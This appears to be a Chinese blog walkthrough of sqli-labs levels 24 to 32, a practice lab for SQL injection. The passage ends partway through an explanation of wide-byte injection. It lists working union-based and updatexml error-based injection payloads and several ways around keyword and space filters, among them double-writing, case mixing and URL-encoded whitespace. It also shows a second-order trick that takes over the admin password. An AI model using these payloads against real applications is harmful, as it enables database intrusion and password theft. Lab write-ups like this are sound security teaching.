+<p>先注册一个admin’#用户<br><img src="/2020/03/17/sqli_labs21-37/7.png" alt><br>注册后的数据库<br><img src="/2020/03/17/sqli_labs21-37/8.png" alt><br>然后登陆并修改密码<br><img src="/2020/03/17/sqli_labs21-37/9.png" alt><br>然后便可以使用admin登陆了，密码为修改后的密码<br><img src="/2020/03/17/sqli_labs21-37/10.png" alt><br><img src="/2020/03/17/sqli_labs21-37/11.png" alt><br>修改密码后的数据库<br><img src="/2020/03/17/sqli_labs21-37/12.png" alt></p>
+<h1 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h1><p>基于错误_GET_过滤OR/AND_单引号_字符型注入<br>输入：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1	正常</span><br><span class="line">id=1'	错误</span><br><span class="line">id=1'--+	正常回显</span><br></pre></td></tr></table></figure>
+
+<p>并且过滤了or 和and<br><img src="/2020/03/17/sqli_labs21-37/13.png" alt><br>这样我们便不能使用<code>order by</code>查询字段，但是我们可以直接使用union</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=1'union select 1,2,3,4--+	错误回显</span><br><span class="line"><span class="attribute">id</span>=1'union select 1,2,3--+		正常回显</span><br><span class="line"></span><br><span class="line">查询数据库名字</span><br><span class="line"><span class="attribute">id</span>=-1'union select 1,database(),3--+</span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line"><span class="attribute">id</span>=-1'union select 1,group_concat(table_name),3 <span class="keyword">from</span> infoorrmation_schema.tables where <span class="attribute">table_schema</span>=<span class="string">'security'</span>--+   #这里由于过滤了<span class="keyword">or</span>，所以information里面的<span class="keyword">or</span>也被过滤了，所以可以尝试双写绕过</span><br><span class="line"></span><br><span class="line">查询列名</span><br><span class="line"><span class="attribute">id</span>=-1'union select 1,group_concat(column_name),3 <span class="keyword">from</span> infoorrmation_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>--+ </span><br><span class="line"></span><br><span class="line">查询字段</span><br><span class="line"><span class="attribute">id</span>=-1'union select 1,group_concat(username,passwoorrd),3 <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/14.png" alt></p>
+<h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><p>有过滤的时候首先要判断这个过滤是<strong>一次性</strong>的还是<strong>非一次性</strong>的：</p>
+<p>若是<strong>一次性</strong>的，且只是将过滤字符换成了空字符：</p>
+<blockquote>
+<ul>
+<li>双写——<code>or</code>=<code>oorr</code>、<code>and</code>=<code>anandd</code> </li>
+</ul>
+</blockquote>
+<p>若是<strong>非一次性</strong>的，就要考虑一些变形：</p>
+<blockquote>
+<ul>
+<li>大小写变形——<code>or</code>=<code>Or</code>=<code>oR</code>=<code>OR</code> </li>
+<li>利用运算符——<code>or</code>=<code>||</code>、<code>and</code>=<code>&amp;&amp;</code> </li>
+<li>URL编码——<code>#</code>=<code>%23</code>，Hex编码——<code>~</code>=<code>0x7e</code> </li>
+<li>添加注释——<code>/*or*/</code></li>
+</ul>
+</blockquote>
+<h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>这一关单引号双引号都没有回显，所以尝试一下数字型注入，正常回显<br><img src="/2020/03/17/sqli_labs21-37/15.png" alt><br>然后就与less-25一样了</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查询数据库名字</span><br><span class="line">id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span></span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line">id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>),<span class="number">3</span> <span class="keyword">from</span> infoorrmation_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span>   #这里由于过滤了<span class="keyword">or</span>，所以information里面的<span class="keyword">or</span>也被过滤了，所以可以尝试双写绕过</span><br><span class="line"></span><br><span class="line">查询列名</span><br><span class="line">id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span> <span class="keyword">from</span> infoorrmation_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span></span><br><span class="line"></span><br><span class="line">查询字段</span><br><span class="line">id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,passwoorrd),<span class="number">3</span> <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/16.png" alt></p>
+<h1 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h1><p>基于错误_GET_过滤空格/注释_单引号_字符型注入<br>先判断注入类型</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1	正常</span><br><span class="line">id=1'	错误回显</span><br><span class="line">id=1<span class="string">"	正常</span></span><br></pre></td></tr></table></figure>
+
+<p>但是过滤了空格，注释符，or 和and<br>查看一下源码</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = blacklist(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$hint</span> =<span class="variable">$id</span>;</span><br><span class="line">function blacklist(<span class="variable">$id</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>,<span class="variable">$id</span>);             <span class="regexp">//strip</span> out OR (non <span class="keyword">case</span> sensitive)</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>,<span class="variable">$id</span>);            <span class="regexp">//</span>Strip out AND (non <span class="keyword">case</span> sensitive)</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>,<span class="variable">$id</span>);          <span class="regexp">//strip</span> out /*</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>,<span class="variable">$id</span>);            <span class="regexp">//</span>Strip out --</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>,<span class="variable">$id</span>);             <span class="regexp">//</span>Strip out <span class="comment">#</span></span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>,<span class="variable">$id</span>);            <span class="regexp">//</span>Strip out spaces</span><br><span class="line">    <span class="variable">$id</span> = preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>,<span class="variable">$id</span>);        <span class="regexp">//</span>Strip out slashes</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不仅过滤了上一关的<code>or</code>与<code>and</code>，还过滤了单行注释<code>--</code>与<code>#(含URL编码)</code>以及多行注释<code>/**/</code>（被解释为空格，常用于过滤空格时），还过滤了<code>(空格)</code>，以及正反斜杠<code>/</code>与<code>\</code>。</p>
+<p>有三种注入方式，两个明注和一个盲注。</p>
+<ul>
+<li>明注一：因正确回显非固定字符串，可利用特殊 URL 编码代替空格，仍使用<code>union</code>加空格连接<code>select</code>联合注入。</li>
+<li>明注二：因错误回显是 MySQL 错误信息，可利用报错注入即 Less 17 中提到的几种方法，首选是<code>updatexml()注入</code>与<code>extractvalue()注入</code>，因其他方法仍不能避开空格的使用。</li>
+<li>盲注：基于 Bool 盲注，构造注入语句避开空格。</li>
+</ul>
+<h2 id="正确注入："><a href="#正确注入：" class="headerlink" title="正确注入："></a>正确注入：</h2><p>这里是空格的 URL 编码替代方法。</p>
+<ul>
+<li><code>%09</code> TAB 键（水平）</li>
+<li><code>%0a</code> 新建一行</li>
+<li><code>%0b</code> TAB 键（垂直）</li>
+<li><code>%0c</code> 新的一页</li>
+<li><code>%0d</code> return 功能</li>
+<li><code>%a0</code> 空格</li>
+</ul>
+<p>我们使用%a0代替空格，使用less-23的方法试构造额外的逻辑运算来绕过<br>payoad</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">查看字段</span><br><span class="line">id=<span class="number">-1</span>'union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,<span class="number">2</span>,<span class="number">3</span><span class="symbol">%a0oorr</span>'</span><br><span class="line"></span><br><span class="line">查看库名</span><br><span class="line">id=<span class="number">0</span>'union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,database(),<span class="number">3</span><span class="symbol">%a0oorr</span>' #由于过滤了-，所以这里可以使用id=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">差看表名</span><br><span class="line">id=<span class="number">0</span>'union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,group_concat(table_name),<span class="number">3</span><span class="symbol">%a0from</span><span class="symbol">%a0infoorrmation_schema.tables</span><span class="symbol">%a0where</span><span class="symbol">%a0table_schema</span>='security'<span class="symbol">%a0oorr</span>'</span><br><span class="line"></span><br><span class="line">查看列名</span><br><span class="line">id=<span class="number">0</span>'union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,group_concat(column_name),<span class="number">3</span><span class="symbol">%a0from</span><span class="symbol">%a0infoorrmation_schema.columns</span><span class="symbol">%a0where</span><span class="symbol">%a0table_name</span>='users'<span class="symbol">%a0oorr</span>'</span><br><span class="line"></span><br><span class="line">查看内容</span><br><span class="line">id=<span class="number">0</span>'union<span class="symbol">%a0select</span><span class="symbol">%a01</span>,(<span class="keyword">select</span><span class="symbol">%a0group_concat</span>(concat_ws('-',id,username,passwoorrd))<span class="symbol">%a0from</span><span class="symbol">%a0users</span>),<span class="number">3</span><span class="symbol">%a0oorr</span>'</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/17.png" alt></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>这里用到的是<code>updatexml()</code>函数，选用这个函数是因为没有需要空格的地方，可以用小括号和运算符代替</p>
+<p>报错注入用法</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">'#'</span>,(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> ...) a)),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看库名</span><br><span class="line">id=0'||updatexml(1,concat('$',(database())),0)||'</span><br><span class="line"></span><br><span class="line">差看表名</span><br><span class="line">id=0'||updatexml(1,concat('$',(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(infoorrmation_schema.tables)<span class="keyword">where</span>(table_schema=<span class="string">'security'</span>))),<span class="number">0</span>)||<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看列名</span></span><br><span class="line"><span class="string">?id=0'</span>||updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">'$'</span>,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(infoorrmation_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>))),<span class="number">0</span>)||<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看内容</span></span><br><span class="line"><span class="string">?id=0'</span>||updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">'$'</span>,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="keyword">id</span>,username,passwoorrd))<span class="keyword">from</span>(<span class="keyword">users</span>))),<span class="number">0</span>)||<span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h1><p>基于错误_GET_过滤空格/注释_单引号_小括号_字符型_盲注</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">id=1		正常回显</span><br><span class="line">id=1'		无回显</span><br><span class="line">id=1<span class="string">"		正常回显</span></span><br></pre></td></tr></table></figure>
+
+<p>可以判断为单引号字符型注入<br>然后判断是否有小括号判断小括号有几种方法：</p>
+<ol>
+<li><code>2&#39;&amp;&amp;&#39;1&#39;=&#39;1</code></li>
+</ol>
+<ul>
+<li>若查询语句为<code>where id=&#39;$id&#39;</code>，查询时是<code>where id=&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;</code>，结果是<code>where id=&#39;2&#39;</code>，回显会是<code>id=2</code>。</li>
+<li>若查询语句为<code>where id=(&#39;$id&#39;)</code>，查询时是<code>where id=(&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;)</code>，MySQL 将<code>&#39;2&#39;</code>作为了 Bool 值，结果是<code>where id=(&#39;1&#39;)</code>，回显会是<code>id=1</code>。</li>
+</ul>
+<ol start="2">
+<li><code>1&#39;)||&#39;1&#39;=(&#39;1</code><br> 若查询语句有小括号正确回显，若无小括号错误回显（无回显）</li>
+</ol>
+<p><img src="/2020/03/17/sqli_labs21-37/18.png" alt><br>说明存在小括号<br>然后与less-26一样</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先查字段</span><br><span class="line">id=-<span class="number">1</span><span class="meta">%27</span>)<span class="meta">%a0union</span><span class="meta">%a0select</span><span class="meta">%a01</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">%a0oorr</span>(<span class="meta">%27</span></span><br></pre></td></tr></table></figure>
+
+<p>查数据库名</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="symbol">%27</span>)<span class="symbol">%a0union</span><span class="symbol">%a0select</span><span class="symbol">%a01</span>,database(),<span class="number">3</span><span class="symbol">%a0anandd</span><span class="symbol">%a0</span>(<span class="symbol">%27</span></span><br></pre></td></tr></table></figure>
+
+<p>查表名</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="symbol">%27</span>)<span class="symbol">%a0union</span><span class="symbol">%a0select</span><span class="symbol">%a01</span>,group_concat(table_name),<span class="number">3</span><span class="symbol">%a0from</span><span class="symbol">%a0infoorrmation_schema.tables</span><span class="symbol">%a0where</span><span class="symbol">%a0table_schema</span>=database()<span class="symbol">%a0</span><span class="symbol">%26</span><span class="symbol">%26</span><span class="symbol">%a0</span>(<span class="symbol">%271</span><span class="symbol">%27</span>)=(<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>
+
+<p>列名</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span>')<span class="symbol">%a0union</span><span class="symbol">%a0select</span><span class="symbol">%a01</span>,group_concat(column_name),<span class="number">3</span><span class="symbol">%a0from</span><span class="symbol">%a0infoorrmation_schema.columns</span><span class="symbol">%a0where</span><span class="symbol">%a0table_name</span>='users'<span class="symbol">%a0</span><span class="symbol">%26</span><span class="symbol">%26</span><span class="symbol">%a0</span>('<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>内容</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="symbol">%27</span>)<span class="symbol">%a0union</span><span class="symbol">%a0select</span><span class="symbol">%a01</span>,group_concat(username,<span class="number">0x3a</span>,passwoorrd),<span class="number">3</span><span class="symbol">%a0from</span><span class="symbol">%a0users</span><span class="symbol">%a0where</span><span class="symbol">%a0</span>(<span class="symbol">%271</span><span class="symbol">%27</span>)=(<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/19.png" alt></p>
+<h1 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line"><span class="attribute">id</span>=1		正常回显</span><br><span class="line"><span class="attribute">id</span>=1'		无回显</span><br><span class="line"><span class="attribute">id</span>=1"		正常回显</span><br><span class="line"><span class="attribute">id</span>=1'or'	正常回显</span><br></pre></td></tr></table></figure>
+
+<p>所以可以判断为单引号字符型，无小括号<br>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$id = blacklist($id);</span><br><span class="line">$hint = $id;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>,$id);       <span class="comment">//strip out /*</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>,$id);         <span class="comment">//Strip out --.</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>,$id);          <span class="comment">//Strip out #.</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>,$id);         <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>,$id);      <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>,$id);         <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>,$id);       <span class="comment">//Strip out union</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>,$id);      <span class="comment">//Strip out select</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>,$id);       <span class="comment">//Strip out UNION</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>,$id);      <span class="comment">//Strip out SELECT</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>,$id);       <span class="comment">//Strip out Union</span></span><br><span class="line">    $id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>,$id);      <span class="comment">//Strip out select</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现没有过滤<code>or</code>与<code>and</code>，过滤了几个大小写的<code>union</code>和<code>select</code>但是可以用随机大小写绕过，过滤了<code>--</code>、<code>#</code>以及<code>/**/</code>，过滤了两次<code>空格</code>，过滤了<code>/</code>但没过滤<code>\</code>。<br> 所以实际上只过滤了<code>注释</code>与<code>空格</code>，与 Less 26 相似。</p>
+<p>直接明注</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆内容</span><br><span class="line">id=<span class="number">0</span><span class="meta">%27uunionnion</span><span class="meta">%a0sElect</span><span class="meta">%a01</span>,(sElect<span class="meta">%a0password</span><span class="meta">%a0from</span><span class="meta">%a0users</span><span class="meta">%a0limit</span><span class="meta">%a03</span>,<span class="number">1</span>),<span class="number">3</span><span class="meta">%a0or</span><span class="meta">%27</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/20.png" alt></p>
+<h1 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h1><p><code>1</code>和<code>1&#39;</code>正常回显，<code>1&quot;</code>报错，双引号字符型。<br><code>2&quot;%26%26&quot;1&quot;=&quot;1</code>回显为<code>id=2</code>，无小括号<br>与上一关一样正常注入</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">库名</span><br><span class="line">id=<span class="number">0</span>%22%0AUNIon%0AsElect%0A1,database(),<span class="number">3</span>%a0or%22		<span class="comment">#注：id=0</span></span><br><span class="line">列名</span><br><span class="line">id=<span class="number">0</span>%22%0AUNIon%0AsElect%0A1,group_concat(column_name),<span class="number">3</span>%0afrom%a0information_schema.columns%0awhere%0atable_name=%27users%27%a0or%22</span><br><span class="line">内容</span><br><span class="line">id=<span class="number">0</span>%22%0AUNIon%0AsElect%0A1,(sElect%a0password%a0from%a0users%a0limit%a03,<span class="number">1</span>),<span class="number">3</span>%a0or%22</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/21.png" alt></p>
+<h1 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="attribute">id</span>=1		正常</span><br><span class="line"><span class="attribute">id</span>=1'		错误</span><br><span class="line"><span class="attribute">id</span>=1"		正常</span><br><span class="line"><span class="attribute">id</span>=1'%0Aor%0A1=1%0Aor'		正常，成功闭合单引号</span><br></pre></td></tr></table></figure>
+
+<p>当使用<code>union select</code>查询字段是，发现只要同时出现union和select变回删除union和select<br><img src="/2020/03/17/sqli_labs21-37/22.png" alt><br>我们可以双写绕过<br>但是字段任然爆不出来,后面才发现原来没有测试是否有小括号判断小括号有几种方法：</p>
+<ol>
+<li><code>2&#39;&amp;&amp;&#39;1&#39;=&#39;1</code></li>
+</ol>
+<ul>
+<li>若查询语句为<code>where id=&#39;$id&#39;</code>，查询时是<code>where id=&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;</code>，结果是<code>where id=&#39;2&#39;</code>，回显会是<code>id=2</code>。</li>
+<li>若查询语句为<code>where id=(&#39;$id&#39;)</code>，查询时是<code>where id=(&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;)</code>，MySQL 将<code>&#39;2&#39;</code>作为了 Bool 值，结果是<code>where id=(&#39;1&#39;)</code>，回显会是<code>id=1</code>。</li>
+</ul>
+<ol start="2">
+<li><code>1&#39;)||&#39;1&#39;=(&#39;1</code><br> 若查询语句有小括号正确回显，若无小括号错误回显（无回显）。</li>
+</ol>
+<p>我们使用第二种方法，发现正常回显，说明有小括号<br><img src="/2020/03/17/sqli_labs21-37/23.png" alt></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字段</span><br><span class="line">id=<span class="number">1</span>')%<span class="number">0</span>Aunion%<span class="number">0</span>Aunion%<span class="number">0</span>Aselect%<span class="number">0</span>Aselect%<span class="number">0</span>A1,<span class="number">2</span>,<span class="number">3</span>%<span class="number">0</span>Aor('</span><br><span class="line">表名</span><br><span class="line">id=<span class="number">1</span>')%<span class="number">0</span>Aunion%<span class="number">0</span>Aunion%<span class="number">0</span>Aselect%<span class="number">0</span>Aselect%<span class="number">0</span>A1,group_concat(table_name),<span class="number">3</span>%<span class="number">0</span>afrom%<span class="number">0</span>ainformation_schema.tables%<span class="number">0</span>awhere%<span class="number">0</span>atable_schema=database()%<span class="number">0</span>Aor('</span><br><span class="line">列名</span><br><span class="line">id=<span class="number">0</span>')%<span class="number">0</span>Aunion%<span class="number">0</span>Aunion%<span class="number">0</span>Aselect%<span class="number">0</span>Aselect%<span class="number">0</span>A1,group_concat(column_name),<span class="number">3</span>%<span class="number">0</span>Afrom%<span class="number">0</span>Ainformation_schema.columns%<span class="number">0</span>Awhere%<span class="number">0</span>Atable_name='users'%<span class="number">0</span>Aor('</span><br><span class="line">内容</span><br><span class="line">id=<span class="number">0</span>')%<span class="number">0</span>Aunion%<span class="number">0</span>Aunion%<span class="number">0</span>Aselect%<span class="number">0</span>Aselect%<span class="number">0</span>A1,(select%<span class="number">0</span>Ausername%<span class="number">0</span>Afrom%<span class="number">0</span>Ausers%<span class="number">0</span>Alimit%<span class="number">0</span>A2,<span class="number">1</span>),<span class="number">3</span>%<span class="number">0</span>Aor('</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/24.png" alt></p>
+<h1 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h1><p>这一关用less-28的payload也可以</p>
+<h1 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h1><p>这个是简单的单引号字符型注入，使用联合注入就可以了，29-31实际上是两层服务器架构，在做这三关之前需要把 Tomcat 为引擎的 jsp 服务器搭好，等以后再回来搭一下</p>
+<h1 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h1><p>这一关为双引号字符型注入</p>
+<h1 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h1><p>简单测试后，为双引号+有括号字符型注入，接着与30关一样</p>
+<p><img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt></p>
+<h1 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h1><p>这一关发现hint多了一个<code>The Query String you input in Hex becomes :</code><br>当我们输入</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1		正常回显</span><br><span class="line">id=1'		错误回显</span><br></pre></td></tr></table></figure>
+
+<p>并且发现我们的<code>&#39;</code>被<code>\</code>注释掉了，这个便联想到宽字节注入</p>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>PHP 自带一些转义特殊字符的函数，如<code>addslashes()</code>，<code>mysql_real_escape_string()</code>，<code>mysql_escape_string()</code>等，这些函数可用来防止 SQL 注入。</p>
+<p>如<code>id=1&#39;or&#39;1&#39;=&#39;1</code>，单引号本用来闭合语句，这些函数会自动转义这些闭合的单引号，在这些单引号前面加上转义符<code>\</code>，变为<code>1\&#39;or\&#39;1\&#39;=\&#39;1</code>，如此在 SQL 查询中仍然一个普通的字符串，不能进行注入。</p>
+<p>而网站在过滤<code>&#39;</code>的时候，通常的思路就是将<code>&#39;</code>转换为<code>\&#39;</code>,因此我们在此想办法将<code>&#39;</code>前面添加的<code>\</code>去掉，一般有两种思路：</p>
+<ol>
